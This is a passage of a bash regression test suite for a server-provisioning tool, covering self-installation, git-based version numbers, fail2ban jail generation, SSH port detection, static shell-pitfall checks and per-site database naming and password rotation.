section "self-installation (regression: the command runs the installed copy)"
# "lompstack" runs the copy under INSTALL_DIR, not the checkout, so a git pull alone does
# not change what runs. lib_install_self refreshes it, and must never replace a working
# installation with a checkout that does not parse.
SRC_GOOD="$TMP/src-good"
mkdir -p "$SRC_GOOD/lib"
printf '#!/usr/bin/env bash\necho marker-v1\n' >"$SRC_GOOD/setup.sh"
printf '# lib a\n' >"$SRC_GOOD/lib/a.sh"
printf '# lib b\n' >"$SRC_GOOD/lib/b.sh"
assert_eq "install_self exits 0" 0 "$(run_isolated lib_install_self "$SRC_GOOD")"
assert_true "setup.sh copied" test -f "${INSTALL_DIR}/setup.sh"
if (( CAN_SYMLINK )); then
  assert_true "long command linked" test -L "$BIN_LINK"
  assert_true "short alias linked" test -L "$BIN_SHORT"
  assert_eq "both names point at the same script" "$(readlink -f "$BIN_LINK")" "$(readlink -f "$BIN_SHORT")"
  # an unrelated program owning the short name must not be replaced
  rm -f "$BIN_SHORT"; printf '#!/bin/sh\necho other\n' >"$BIN_SHORT"
  lib_install_self "$SRC_GOOD" >/dev/null 2>&1
  assert_false "a real file at the short name is left alone" test -L "$BIN_SHORT"
  assert_has "the foreign program survived" "echo other" "$(cat "$BIN_SHORT")"
  rm -f "$BIN_SHORT"
fi
assert_true "lib copied" test -f "${INSTALL_DIR}/lib/a.sh"
assert_has "copied content is the source" "marker-v1" "$(cat "${INSTALL_DIR}/setup.sh")"
# compared by suffix: MSYS rewrites absolute paths when handing them to jq
assert_has "source dir recorded for self-update" "src-good" "$(lib_manifest_get '.install.source_dir')"

# a file removed from the checkout must disappear from the installation
rm -f "$SRC_GOOD/lib/b.sh"
printf '#!/usr/bin/env bash\necho marker-v2\n' >"$SRC_GOOD/setup.sh"
lib_install_self "$SRC_GOOD" >/dev/null 2>&1
assert_has "second copy updated" "marker-v2" "$(cat "${INSTALL_DIR}/setup.sh")"
assert_false "deleted module is gone from the installation" test -f "${INSTALL_DIR}/lib/b.sh"
assert_false "no staging leftovers" test -e "${INSTALL_DIR}/lib.new"
assert_false "no rollback leftovers" test -e "${INSTALL_DIR}/lib.old"

SRC_BAD="$TMP/src-bad"
mkdir -p "$SRC_BAD/lib"
printf '#!/usr/bin/env bash\necho ok\n' >"$SRC_BAD/setup.sh"
printf 'if then fi\n' >"$SRC_BAD/lib/broken.sh"
assert_eq "a checkout that does not parse is refused" 1 "$(run_isolated lib_install_self "$SRC_BAD")"
assert_has "the good installation survived" "marker-v2" "$(cat "${INSTALL_DIR}/setup.sh")"
assert_false "the broken module was not installed" test -f "${INSTALL_DIR}/lib/broken.sh"

# =============================================================================
section "version number (counted by git, carried by the installed copy)"
# setup.sh declares only the release line; the last number counts the commits since the first
# one, so every change that reaches main raises it and nobody edits a number. The copy under
# INSTALL_DIR is no checkout, so lib_install_self writes the version into its VERSION file.
if lib_have git; then
  # the fixture's commits must not depend on this machine's git configuration (signing, hooks)
  mkdir -p "$TMP/vgit-home"
  vgit() {
    HOME="$TMP/vgit-home" XDG_CONFIG_HOME="$TMP/vgit-home" GIT_CONFIG_NOSYSTEM=1 \
      git -c user.name=unit -c user.email=unit@example.invalid -c init.defaultBranch=main "$@"
  }
  VREPO="$TMP/vrepo"
  mkdir -p "$VREPO/lib"
  printf '#!/usr/bin/env bash\nreadonly SCRIPT_VERSION_LINE="2.5"\necho vrepo\n' >"$VREPO/setup.sh"
  printf '# lib a\n' >"$VREPO/lib/a.sh"
  vgit init -q "$VREPO"
  vgit -C "$VREPO" add -A
  vgit -C "$VREPO" commit -q -m first
  vgit -C "$VREPO" commit -q --allow-empty -m second
  vgit -C "$VREPO" commit -q --allow-empty -m third
  assert_eq "a checkout counts the commits after the first" "2.5.2" "$(lib_version_detect "$VREPO")"
  assert_eq "an older revision counts fewer" "1" "$(lib_version_count "$VREPO" HEAD~1)"
  assert_eq "no revision, no count" "" "$(lib_version_count "$VREPO" "")"
  vgit -C "$VREPO" commit -q --allow-empty -m fourth
  assert_eq "each commit raises it by one" "2.5.3" "$(lib_version_detect "$VREPO")"

  # a shallow clone has lost the commits it would count: say so rather than print a wrong number
  cp -a "$VREPO" "$TMP/vshallow"
  vgit -C "$TMP/vshallow" rev-parse HEAD~1 >"$TMP/vshallow/.git/shallow"
  assert_eq "a shallow clone gives no count" "2.5.x" "$(lib_version_detect "$TMP/vshallow")"
  assert_eq "nor does a plain directory" "${SCRIPT_VERSION_LINE}.x" "$(lib_version_detect "$SRC_GOOD")"

  lib_install_self "$VREPO" >/dev/null 2>&1
  assert_eq "the installed copy carries its version" "2.5.3" "$(cat "${INSTALL_DIR}/VERSION")"
  assert_eq "and reports it" "2.5.3" "$(lib_version_detect "$INSTALL_DIR")"
  assert_false "no staged VERSION left behind" test -e "${INSTALL_DIR}/VERSION.new"

  # a copy that an older release installed has no VERSION: it is counted in the checkout it came
  # from, at the revision recorded then - not at wherever that checkout's HEAD is now
  rm -f "${INSTALL_DIR}/VERSION"
  vgit -C "$VREPO" commit -q --allow-empty -m fifth
  assert_eq "a copy without VERSION counts at its recorded revision" "2.5.3" "$(lib_version_detect "$INSTALL_DIR")"
  printf 'garbage\n' >"${INSTALL_DIR}/VERSION"
  assert_eq "a VERSION that is no version is not believed" "2.5.x" "$(lib_version_detect "$INSTALL_DIR")"

  # setup.sh works its version out when it starts, before anything prints it
  VCOPY="$TMP/vcopy"
  mkdir -p "$VCOPY"; cp -a "$ROOT/setup.sh" "$ROOT/lib" "$VCOPY/"
  printf '7.7.7\n' >"$VCOPY/VERSION"
  assert_eq "setup.sh --version prints its copy's version" "setup.sh 7.7.7" "$(bash "$VCOPY/setup.sh" --version 2>&1 | head -n 1)"

  # self-update shows the checkout's step from one version to the next, and ends with the version
  # it installed, not the one of the release that is running
  vgit clone -q "$VREPO" "$TMP/vclone"
  vgit -C "$VREPO" commit -q --allow-empty -m sixth
  V_OLD="$(git -C "$TMP/vclone" rev-parse --short HEAD)"; V_NEW="$(git -C "$VREPO" rev-parse --short HEAD)"
  V_OUT="$(OPT_QUIET=0; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_has "self-update names both versions" "Checkout updated: 2.5.4 (${V_OLD}) -> 2.5.5 (${V_NEW})" "$V_OUT"
  assert_has "and the one it installed" "Now running lompstack 2.5.5 (${V_NEW})" "$V_OUT"
  assert_eq  "then applies what that release changes, last" "MIGRATE-RUN" "$(tail -n 1 <<<"$V_OUT")"
  V_OUT="$(OPT_QUIET=0; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_has "a second run finds nothing new" "Already at the latest revision: 2.5.5 (${V_NEW})" "$V_OUT"
  assert_has "and still applies them: an older release's self-update could not" "MIGRATE-RUN" "$V_OUT"
  V_OUT="$(OPT_QUIET=0; OPT_DRY_RUN=1; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_lacks "a dry run applies nothing" "MIGRATE-RUN" "$V_OUT"
  # the copy it installed does the work, in this process's place; one from before "migrate"
  # existed is left to update
  _mg_inst="$INSTALL_DIR"; INSTALL_DIR="$TMP/mg-inst"; mkdir -p "$INSTALL_DIR/lib"
  printf '#!/bin/bash\necho "ran: $*"\n' >"$INSTALL_DIR/setup.sh"; chmod +x "$INSTALL_DIR/setup.sh"
  : >"$INSTALL_DIR/lib/install.sh"
  V_OUT="$(OPT_QUIET=0; lib_selfupdate_migrate 2>&1; echo still-here)"
  assert_has   "an older copy is told to run update" "'sudo lomp update' applies" "$V_OUT"
  assert_lacks "and is not run"                      "ran:" "$V_OUT"
  printf 'lib_install_migrate() {\n' >"$INSTALL_DIR/lib/install.sh"
  V_OUT="$(OPT_QUIET=0; lib_selfupdate_migrate 2>&1; echo still-here)"
  assert_has   "the installed copy runs migrate" "ran: migrate" "$V_OUT"
  assert_lacks "in place of the release that installed it" "still-here" "$V_OUT"
  INSTALL_DIR="$_mg_inst"

  # a directory that is no checkout installs as "x", with no revision left over from before
  lib_install_self "$SRC_GOOD" >/dev/null 2>&1
  assert_eq "a copy of a plain directory has no count" "${SCRIPT_VERSION_LINE}.x" "$(lib_version_detect "$INSTALL_DIR")"
  assert_eq "and no revision" "" "$(lib_manifest_get '.install.revision')"
  unset -f vgit
else
  section "  (no git: version number tests skipped)"
fi

# =============================================================================
section "interactive menu"
# The menu must never hijack a non-interactive run: cron, pipes and --non-interactive
# have to keep getting the ordinary help output instead of a prompt nobody can answer.
menu_out="$(lib_menu_main 2>&1)"
assert_has "no terminal falls back to help" "USAGE" "$menu_out"
assert_has "help mentions the menu" "Interactive menu" "$menu_out"
assert_eq "menu exits 0 without a terminal" 0 "$(run_isolated lib_menu_main)"
OPT_NON_INTERACTIVE=1
assert_eq "menu exits 0 when non-interactive" 0 "$(run_isolated lib_menu_main)"
OPT_NON_INTERACTIVE=1   # the suite runs non-interactive throughout
assert_has "command name prefers the short alias" "lomp" "$(_menu_cmd_name)"

# Adding a site from the menu with Enter everywhere. A site usually goes in before its DNS
# moves here, so no certificate is asked for yet, and the contact is the site's own address.
_madd() {   # domain [question=answer...] -> the command the menu runs
  (
    eval '_menu_ask() { local -n _o="$1"; _o="${_ma[$1]-${3:-}}"; }
          _menu_run() { printf "%s\n" "$*"; }
          lib_mail_installed() { return 1; }'
    declare -A _ma=([domain]="$1"); shift
    for _kv in "$@"; do _ma[${_kv%%=*}]="${_kv#*=}"; done
    _menu_add_site 2>/dev/null | tail -n 1
  )
}
assert_eq "Enter everywhere: www, no certificate yet, info@ the site" \
  "add KumeSos.com --www --no-ssl --email info@kumesos.com" "$(_madd KumeSos.com)"
assert_eq "a certificate and another address when asked for" \
  "add kumesos.com --email ops@example.org" "$(_madd kumesos.com www=n ssl=y email=ops@example.org)"

# =============================================================================
section "smoke test expectations per site mode"
# A proxy site is created before its application is deployed, so 502/503 from an absent
# backend must count as success. Getting this wrong made "add --proxy" roll the whole
# site back for a completely normal situation.
lib_domain_state_reset
D_MODE="php";    assert_eq "php site"            "200|301|302"                 "$(lib_domain_expected_codes)"
D_MODE="static"; assert_eq "static site"         "200|301|302"                 "$(lib_domain_expected_codes)"
D_MODE="proxy";  assert_eq "proxy tolerates 50x" "200|301|302|502|503|504"     "$(lib_domain_expected_codes)"
D_MODE="php"; D_WWW=1; D_WWW_PRIMARY=1
assert_eq "apex redirects to www"                "301|302"                     "$(lib_domain_expected_codes)"
D_MODE="proxy"
assert_eq "proxy plus www-primary"               "301|302|502|503|504"         "$(lib_domain_expected_codes)"
D_MODE="php"; D_WWW=0; D_WWW_PRIMARY=0
assert_eq "lenient also accepts 403"             "200|301|302|403"             "$(lib_domain_expected_codes lenient)"
assert_eq "helper exits 0"                       0                             "$(run_isolated lib_domain_expected_codes)"
lib_domain_state_reset

# =============================================================================
section "shell pitfalls (static)"
# Under set -u a "local x" that is only assigned on some branches aborts the script when it
# is read on another branch. This bit lib_db_install ("dump: unbound variable") on a real
# server, so every scalar local must be initialised at declaration.
bare_locals="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    BEGIN { q = sprintf("%c", 39); hd = "" }            # a literal single quote
    # A here-document body is data, not code: Postfix master.cf has a service called "local",
    # and a renderer that prints it must not read as a bare "local" declaration.
    {
      if (hd != "") { if ($0 ~ "^[[:space:]]*" hd "[[:space:]]*$") hd = ""; next }
      probe = $0
      gsub(/<<</, "@@@", probe)                         # a here-string is not a here-document
      if (match(probe, /<<-?[[:space:]]*[A-Za-z_"]+/) || match(probe, "<<-?[[:space:]]*" q "[A-Za-z_]+" q)) {
        d = substr(probe, RSTART, RLENGTH)
        sub(/^<<-?[[:space:]]*/, "", d)
        gsub("[\"" q "]", "", d)
        if (d != "") { hd = d; next }
      }
    }
    /^[[:space:]]*local[[:space:]]+-/ { next }          # typed declarations are left alone
    /^[[:space:]]*local[[:space:]]/ {
      line=$0
      sub(/^[[:space:]]*local[[:space:]]+/, "", line)
      gsub(/"[^"]*"/, "", line)                         # values may contain spaces
      gsub(q "[^" q "]*" q, "", line)
      gsub(/\$\(\([^)]*\)\)/, "", line)                 # arithmetic values, e.g. $(( A - B ))
      gsub(/\$\([^)]*\)/, "", line)                     # command substitution
      gsub(/\$\{[^}]*\}/, "", line)
      sub(/;.*$/, "", line)                             # another command on the same line
      n=split(line, tok, /[[:space:]]+/)
      for (i=1; i<=n; i++) if (tok[i] ~ /^[A-Za-z_][A-Za-z0-9_]*$/) printf "%s:%d: %s\n", F, NR, tok[i]
    }
  ' "$f"
done)"
assert_eq "every scalar local is initialised" "" "$bare_locals"
# A group that ends in "[[ ... ]] && cmd" exits 1 when the test is false. Feeding such a
# group into a pipeline makes pipefail kill the whole script. This regression guard exists
# because exactly that bug reached a real server in lib_domain_fail2ban_regen.
# The word inside ${x:-word} is quote-processed even inside double quotes, so an apostrophe
# there opens a quoted region that runs to the next one - swallowing whole lines of code with
# no syntax error. This shipped in the mail DNS table: two records silently disappeared.
quoted_defaults="$(grep -nE '\$\{[A-Za-z_][A-Za-z0-9_]*:[-=][^}]*'"'" "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh || true)"
assert_eq "no apostrophe inside a \${x:-default}" "" "$quoted_defaults"
pitfalls="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    /^[[:space:]]*\}[[:space:]]*\|/ {
      if (prev ~ /(^|[^|&])&&[^&]/ || prev ~ /^[[:space:]]*(\[\[|\(\()/) printf "%s:%d: %s\n", F, prevnr, prev
    }
    !/^[[:space:]]*(#|$)/ { prev=$0; prevnr=NR }
  ' "$f"
done)"
assert_eq "no piped group ends in a conditional" "" "$pitfalls"
# A process substitution runs in its own subshell, and "set -E" hands that subshell the ERR
# trap. When a probe inside it fails, the trap prints a full "FAILED: command exited with
# status 255" report in the middle of a perfectly healthy run. Every such probe is optional
# by construction (the caller has a default), so a pipeline inside "< <(...)" must end in
# "|| true". This shipped: "sshd -T" exits 255 on stock Ubuntu 24.04.
procsub="$(grep -nE '< <\(.*\|' "$ROOT/setup.sh" "$ROOT"/lib/*.sh | grep -v '|| true)$' || true)"
assert_eq "a piped process substitution ends in || true" "" "$procsub"
# Sibling of the guard above, on the other side of the substitution. "var=$( (( x )) && cmd )"
# exits 1 whenever the test is false: the substitution's last command failed, and a plain
# assignment adopts its status, so errexit kills the run. Harmless in an ARGUMENT position
# (lib_ok "... $( (( x )) && printf ... )") because there the status is discarded - so only
# assignments are flagged, and only when the substitution carries no || fallback.
# This shipped in lib_domain_summary and killed "add" after the site was already live.
condsub="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    /^[[:space:]]*#/ { next }
    # The substitution must belong to the assignment VALUE: either right after "=", or
    # inside its opening double quote. Without that, "VAR=1 some-command $( (( x )) && ... )"
    # matches too - and that is an environment prefix, not an assignment, so the status
    # belongs to the command and is never adopted.
    match($0, /[A-Za-z_][A-Za-z0-9_]*[+]?=("[^"]*)?\$\([[:space:]]*(\(\(|\[\[)/) {
      rest = substr($0, RSTART)
      if (index(rest, "&&") > 0 && index(rest, "||") == 0) printf "%s:%d: %s\n", F, NR, $0
    }
  ' "$f"
done)"
assert_eq "no assignment takes its status from a conditional substitution" "" "$condsub"

# ...and the function that had it must survive every combination for real
lib_domain_state_reset
D_DOMAIN="sum.example.com"; D_MODE="php"; D_HOME="${SITES_ROOT}/sum.example.com"
D_USER="sum_example_com"; D_GROUP="sum_example_com"; D_PHP="8.3"
D_SSL=0; D_SSL_WANTED=0
assert_eq "summary exits 0 when SSL was never wanted"        0 "$(run_isolated lib_domain_summary)"
assert_has "and tells you how to get one once DNS points here" "renew-ssl sum.example.com" "$(lib_domain_summary 2>&1)"
D_SSL_WANTED=1
assert_eq "summary exits 0 when SSL is wanted but not active" 0 "$(run_isolated lib_domain_summary)"
assert_has "and it tells you how to get one" "renew-ssl" "$(lib_domain_summary 2>&1)"
D_SSL=1
assert_eq "summary exits 0 when SSL is active"                0 "$(run_isolated lib_domain_summary)"
D_WWW=1; D_WP=1; D_DB_NAME="sum_db"
assert_eq "summary exits 0 for a www WordPress site"         0 "$(run_isolated lib_domain_summary)"
lib_domain_state_reset

# ...and a dry run must reach it with the state the rest of the run built up.
# The database step reads domain.json back, because lib_db_create_for_domain writes .db into
# the file directly rather than through the D_* globals. A dry run writes no file, so that
# load failed - and lib_domain_state_load resets every D_* BEFORE it looks at the file. Each
# step reported the site correctly and the closing summary then announced "Site  is ready",
# mode php for a --static site, /public_html as the document root, and the certificate --no-ssl
# had just declined as one that failed ("not active (run: setup.sh renew-ssl ...)").
_orig_dapply="$(declare -f lib_domain_apply_config)"; _orig_reqi="$(declare -f lib_require_installed)"
_orig_smoke="$(declare -f lib_ols_smoke_test)"; _orig_dbi="$(declare -f lib_db_installed)"
# lib_ols_is_installed has no definition left here - an earlier section unset it - so this one
# is removed again below rather than restored.
eval 'lib_ols_is_installed()    { return 0; }'
eval 'lib_domain_apply_config() { return 0; }'
eval 'lib_ols_smoke_test()      { return 0; }'
eval 'lib_db_installed()        { return 0; }'
eval 'lib_require_installed()   { return 0; }'   # the test manifest carries no .installed_at
OPT_DRY_RUN=1
out="$(lib_domain_add_main dry.example.com --static --no-ssl 2>&1)"
OPT_DRY_RUN=0
assert_has   "a dry run names the site it just described" "Site dry.example.com is ready" "$out"
assert_has   "with its URL"           "http://dry.example.com/" "$out"
assert_has   "the mode that was asked for" "Mode                       static" "$out"
assert_has   "its document root"      "${SITES_ROOT}/dry.example.com/public_html" "$out"
assert_has   "its system user"        "dry_example_com (uploaded as root? setup.sh fix-owner dry.example.com)" "$out"
assert_has   "and its logs"           "${SITES_ROOT}/dry.example.com/logs/access.log" "$out"
assert_lacks "never the reset defaults" "Mode                       php" "$out"
assert_has   "the certificate --no-ssl declined as not requested" "not requested (once DNS points here: setup.sh renew-ssl dry.example.com)" "$out"
assert_lacks "never as one that failed" "not active (run: setup.sh renew-ssl" "$out"
assert_false "while the dry run itself registers nothing" lib_domain_registered dry.example.com
unset -f lib_ols_is_installed
eval "$_orig_dapply"; eval "$_orig_smoke"; eval "$_orig_dbi"; eval "$_orig_reqi"
lib_domain_state_reset

# =============================================================================
section "SSH port detection (regression: a failing probe printed a fatal error)"
sshd() { printf 'sshd: no matching key exchange method\n' >&2; return 255; }
ss()   { return 127; }   # minimal container: iproute2 not installed
saved_conn="${SSH_CONNECTION:-}"; unset SSH_CONNECTION
err="$(lib_ssh_ports 2>&1 >/dev/null)"
assert_eq "broken probes print nothing" "" "$err"
assert_eq "falls back to port 22" "22" "$(lib_ssh_ports 2>/dev/null)"
assert_eq "lib_ssh_ports still exits 0" 0 "$(run_isolated lib_ssh_ports)"
SSH_CONNECTION="203.0.113.5 50000 10.0.0.1 2222"
assert_eq "the active connection's port wins" "2222" "$(lib_ssh_ports 2>/dev/null)"
assert_eq "still exits 0 with a connection" 0 "$(run_isolated lib_ssh_ports)"
sshd() { printf 'port 22\nport 2200\npermitrootlogin no\n'; }
assert_eq "ports from sshd -T are merged and sorted" "22 2200 2222" "$(lib_ssh_ports 2>/dev/null)"
unset -f sshd ss
if [[ -n "$saved_conn" ]]; then SSH_CONNECTION="$saved_conn"; else unset SSH_CONNECTION; fi

# =============================================================================
section "lib_join (regression: multi-character separators)"
assert_eq "single item"        "a"           "$(lib_join ', ' a)"
assert_eq "no items"           ""            "$(lib_join ', ')"
assert_eq "one-char separator" "a,b,c"       "$(lib_join ',' a b c)"
# "local IFS=', '" joins on the comma alone and drops the space - the bug this guards
assert_eq "two-char separator" "a, b, c"     "$(lib_join ', ' a b c)"
assert_eq "empty first item"   ", b"         "$(lib_join ', ' '' b)"
assert_eq "separator with a newline and indent" $'x\n          y' "$(lib_join $'\n          ' x y)"

# =============================================================================
section "fail2ban jail regeneration (regression: empty Cloudflare action)"
mkdir -p "$FAIL2BAN_FILTER_DIR"
mv "$STATE_DIR/domains" "$STATE_DIR/domains.bak" 2>/dev/null || true
mkdir -p "$STATE_DIR/domains"
CF_F2B_ACTION="$TMP/cf-action.conf"; CF_F2B_AUTH="$TMP/cf-auth.header"; CF_INI="$TMP/cloudflare-absent.ini"
lib_pkg_installed() { [[ "$1" == "fail2ban" ]]; }
lib_service_active() { return 1; }
# run with errexit explicitly re-armed: this is what the installer does, and what broke
rc=0; ( set -Eeuo pipefail; shopt -s lastpipe; lib_domain_fail2ban_regen ) >/dev/null 2>&1 || rc=$?
assert_eq "regen succeeds with no sites and no Cloudflare token" 0 "$rc"
assert_true "web jail file written" test -s "$FAIL2BAN_WEB_JAIL_FILE"
out="$(cat "$FAIL2BAN_WEB_JAIL_FILE")"
assert_has "wp-login jail present" "[server-setup-wp-login]" "$out"
assert_has "probe jail present" "[server-setup-web-probe]" "$out"
assert_has "jails disabled while there are no sites" "enabled = false" "$out"
assert_lacks "no cloudflare action without a token" "server-setup-cloudflare" "$out"
assert_true "wp-login filter written" test -s "${FAIL2BAN_FILTER_DIR}/server-setup-wp-login.conf"
assert_true "probe filter written" test -s "${FAIL2BAN_FILTER_DIR}/server-setup-web-probe.conf"
if (( CAN_CHMOD )); then assert_eq "jail file is 0600" "600" "$(stat -c %a "$FAIL2BAN_WEB_JAIL_FILE")"; fi
rc=0; ( set -Eeuo pipefail; shopt -s lastpipe; lib_domain_fail2ban_regen ) >/dev/null 2>&1 || rc=$?
assert_eq "second regen is also clean" 0 "$rc"

# The shape that actually runs in production - several sites plus a Cloudflare token -
# renders two constructs the empty case never reaches: the indented multi-line "logpath"
# continuation, and the two-line Cloudflare action block. Both are fail2ban syntax that
# silently disables a jail when it comes out wrong, so assert on them directly.
for d in alpha.example beta.example gamma.example delta.example; do
  mkdir -p "$STATE_DIR/domains/$d" "$SITES_LOG_ROOT/$d"
  printf '{"domain":"%s"}\n' "$d" >"$STATE_DIR/domains/$d/domain.json"
done
: >"$SITES_LOG_ROOT/alpha.example/access.log"; : >"$SITES_LOG_ROOT/beta.example/access.log"
# delta's vhost is an older release's: until update moves them, its logs are in its home
mkdir -p "$SITES_ROOT/delta.example/logs" "$LSWS_VHOSTS_DIR/delta.example"; : >"$SITES_ROOT/delta.example/logs/access.log"
printf 'accesslog $VH_ROOT/logs/access.log {\n}\n' >"$LSWS_VHOSTS_DIR/delta.example/vhconf.conf"
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
: >"$CF_F2B_ACTION"
lib_manifest_set '.cloudflare.account_id' 'acc0123456789'
assert_eq "regen succeeds with sites and a Cloudflare token" 0 "$(run_isolated lib_domain_fail2ban_regen)"
out="$(cat "$FAIL2BAN_WEB_JAIL_FILE")"
assert_has "jails enabled once a site exists" "enabled = true" "$out"
assert_has "first site logpath" "logpath = ${SITES_LOG_ROOT}/alpha.example/access.log" "$out"
# fail2ban only reads the second path as part of logpath while the line stays indented
assert_has "second site is an indented continuation" $'\n          '"${SITES_LOG_ROOT}/beta.example/access.log" "$out"
# fail2ban refuses a jail none of whose files exist, and the reload with it
assert_lacks "a site whose access.log is not there yet is left out" "gamma.example" "$out"
assert_has   "a site whose logs update has not moved yet is read where they are" "${SITES_ROOT}/delta.example/logs/access.log" "$out"
assert_eq "cloudflare action reaches both jails" 2 "$(grep -c 'server-setup-cloudflare' <<<"$out")"
assert_eq "both jails still inherit action_" 2 "$(grep -c '^action = %(action_)s$' <<<"$out")"
assert_has "account passed to the action" 'cfaccount="acc0123456789"' "$out"
# the token used to be an action argument here, which put it on the command line of every ban
assert_lacks "the token itself never reaches the jail file" 'Xv8sQ2pLm9TzR4kWn1bYc7dEf0g' "$out"
# the action block belongs to the jail above it; one stray newline moves it into the next
assert_eq "action stays inside the wp-login jail" "logpath action action_cf [server-setup-web-probe]" \
  "$(awk '/^logpath/{print "logpath"} /^action = /{print "action"} /server-setup-cloudflare/{print "action_cf"} /^\[server-setup-web-probe\]/{print; exit}' <<<"$out" | tr '\n' ' ' | sed 's/ $//')"
assert_eq "second regen with sites is also clean" 0 "$(run_isolated lib_domain_fail2ban_regen)"
if (( CAN_CHMOD )); then assert_eq "the jail file stays 0600" "600" "$(stat -c %a "$FAIL2BAN_WEB_JAIL_FILE")"; fi
# regen is where a server that stored its token before this file existed gets it
assert_true "regen wrote the header file the action reads" test -s "$CF_F2B_AUTH"
rm -rf "$STATE_DIR/domains" "$LSWS_VHOSTS_DIR/delta.example" "$SITES_ROOT/delta.example"
mv "$STATE_DIR/domains.bak" "$STATE_DIR/domains" 2>/dev/null || mkdir -p "$STATE_DIR/domains"

# =============================================================================
section "sshd -t needs its privilege separation directory"
# "Missing privilege separation directory: /run/sshd" failed a real install at step 8 on a
# socket-activated Ubuntu 24.04 host. /run is a tmpfs and ssh.service - the unit carrying
# RuntimeDirectory=sshd - never ran, so the directory simply did not exist.
_psd="$TMP/run-sshd"
assert_false "absent to begin with" test -d "$_psd"
assert_eq "creating it succeeds" 0 "$(run_isolated lib_ssh_privsep_dir_ensure "$_psd")"
assert_true "and it exists" test -d "$_psd"
if (( CAN_CHMOD )); then assert_eq "mode is 0755" "755" "$(stat -c %a "$_psd")"; fi
assert_eq "a second call is a no-op that still succeeds" 0 "$(run_isolated lib_ssh_privsep_dir_ensure "$_psd")"
assert_true "and leaves it in place" test -d "$_psd"

# =============================================================================
section "per-site database naming and defaults"
assert_eq "db base is the first label"      "ilahitube_db"   "$(_db_name_base ilahitube.com db 60)"
assert_eq "user base is the first label"    "ilahitube_user" "$(_db_name_base ilahitube.com user 32)"
assert_eq "a subdomain uses its own label"  "shop_db"        "$(_db_name_base shop.example.com db 60)"
assert_eq "dashes become underscores"       "my_site_db"     "$(_db_name_base my-site.com db 60)"
assert_eq "a leading digit gets a prefix"   "s_123_db"       "$(_db_name_base 123.com db 60)"
# the label is truncated BEFORE the suffix, so the suffix survives MySQL's 32-char user cap
_long="$(_db_name_base averyveryverylongdomainnamethatkeepsgoing.com user 32)"
assert_true  "the user name fits in 32 chars" test "${#_long}" -le 32
assert_eq    "and still ends in _user" "_user" "${_long: -5}"
assert_eq    "db and user bases differ" "1" "$([[ "$(_db_name_base x.com db 60)" != "$(_db_name_base x.com user 32)" ]] && echo 1 || echo 0)"
# every new site gets a database unless it opts out
lib_domain_parse_add_args a.example.com --no-ssl
assert_eq "a database is created by default" "1" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_parse_add_args b.example.com --no-ssl --no-db
assert_eq "--no-db opts out" "0" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_parse_add_args c.example.com --no-ssl --wordpress
assert_eq "wordpress still forces one on" "1" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_state_reset

# "db list" is new code: it has to survive a host with no MariaDB and a host with no sites,
# and it must never print a password - those stay behind "credentials".
_orig_dbinst="$(declare -f lib_db_installed)"; _orig_dbsql="$(declare -f lib_db_sql)"
lib_db_installed() { return 1; }
assert_eq "db list exits 0 without MariaDB" 0 "$(run_isolated lib_db_list)"
# lib_note and lib_ok are suppressed by OPT_QUIET (common.sh:78-83) and this harness runs
# quiet, so the content assertions below have to ask for what a human actually sees.
OPT_QUIET=0
assert_has "and says why" "not installed" "$(lib_db_list 2>&1)"
OPT_QUIET=1
assert_eq "under --quiet it stays silent" "" "$(lib_db_list 2>&1)"
lib_db_installed() { return 0; }
lib_db_sql() { printf '0\n'; }
assert_eq "db list exits 0 with MariaDB present" 0 "$(run_isolated lib_db_list)"
OPT_QUIET=0
assert_has   "it names the columns" "DATABASE" "$(lib_db_list 2>&1)"
assert_has   "and points at credentials for passwords" "credentials" "$(lib_db_list 2>&1)"
assert_lacks "it never prints a password field" "DB password" "$(lib_db_list 2>&1)"
OPT_QUIET=1

# "db passwd": MariaDB, db.info and the application's environment must end up with the SAME
# new password - one of them left behind is a site that cannot reach its database.
_orig_dbsec="$(declare -f lib_db_sql_secret)"; _orig_dbwait="$(declare -f lib_db_wait_ready)"
_pw_old="OldPassOldPassOldPass12345678901"
_pw_dir="$(lib_domain_state_dir pw.example.com)"; mkdir -p "$_pw_dir"
printf '{"domain":"pw.example.com","ident":"pw_example_com","user":"pw_example_com","group":"pw_example_com","mode":"php"}\n' >"$_pw_dir/domain.json"
_pw_reset() {
  printf '# MariaDB credentials for pw.example.com\nDB_NAME=pw_db\nDB_USER=pw_user\nDB_PASS=%s\nDB_HOST=localhost\nDB_CHARSET=utf8mb4\n' "$_pw_old" >"$_pw_dir/db.info"
  printf '{"DB_PASSWORD":"%s","DATABASE_URL":"mysql://pw_user:%s@127.0.0.1:3306/pw_db","API_KEY":"untouched","N":3}\n' "$_pw_old" "$_pw_old" >"$_pw_dir/app-env.json"
  rm -f "$TMP/pw.sql"
}
_pw_pass() { awk -F= '$1=="DB_PASS"{sub(/^[^=]*=/,""); print; exit}' "$_pw_dir/db.info"; }
lib_db_wait_ready() { return 0; }
lib_db_sql_secret() { printf '%s\n' "$2" >"$TMP/pw.sql"; }
_pw_reset
assert_eq    "db passwd succeeds"                   0 "$(run_isolated lib_db_main passwd PW.example.com)"
_pw_new="$(_pw_pass)"
assert_eq    "db.info holds a 32 character password" 32 "${#_pw_new}"
assert_true  "and it is not the old one"            test "$_pw_new" != "$_pw_old"
